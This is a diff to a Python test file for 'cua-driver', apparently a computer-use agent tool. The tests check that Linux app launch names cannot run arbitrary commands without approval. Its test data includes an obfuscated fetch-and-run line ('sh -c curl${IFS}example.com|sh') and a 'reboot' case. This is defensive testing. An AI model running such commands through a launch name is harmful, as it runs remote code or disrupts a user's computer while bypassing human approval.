@@ -750,9 +750,14 @@ def test_ordinary_arguments_pass(tool: str, arguments: dict) -> None:
         # cua-driver runs `sh` with the rest as its arguments: any command.
         ("sh -c curl${IFS}example.com|sh", {"sh"}, True),
         ("python3 -mhttp.server", {"python3"}, True),
-        # No program is called "Google", so the driver matches the app.
+        # A program's own name runs it, in the background: `reboot` restarts
+        # the computer.
+        ("reboot", {"reboot"}, True),
+        ("firefox", {"firefox"}, True),
+        # No program is called "Google" or "Firefox" (PATH is case-sensitive),
+        # so the driver matches the app by its display name.
         ("Google Chrome", set(), False),
-        ("firefox", {"firefox"}, False),
+        ("Firefox", {"firefox"}, False),
     ],
 )
 def test_a_linux_launch_name_is_not_a_command_line(
@@ -760,7 +765,8 @@ def test_a_linux_launch_name_is_not_a_command_line(
 ) -> None:
     """On Linux cua-driver runs `name` as a command line split at spaces
     before it looks for an installed app of that name, so a name could run
-    any program with any arguments without the approval launch_path needs."""
+    any program with any arguments without the approval launch_path needs,
+    and a program's own name ran that program, with none."""
 
     def on_path(word: str) -> str | None:
         return f"/usr/bin/{word}" if word in programs else None
